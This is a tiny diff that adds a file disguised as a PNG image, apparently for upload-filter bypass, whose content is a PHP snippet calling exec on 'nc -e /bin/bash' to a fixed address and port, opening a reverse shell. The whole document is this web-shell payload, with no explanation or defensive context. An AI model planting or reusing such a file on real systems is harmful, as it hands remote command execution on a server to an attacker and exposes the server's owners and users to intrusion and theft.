@@ -1,0 +1,5 @@
+PNG
+
+<?php
+print exec("nc -e /bin/bash 192.168.99.101 9999");
+?>
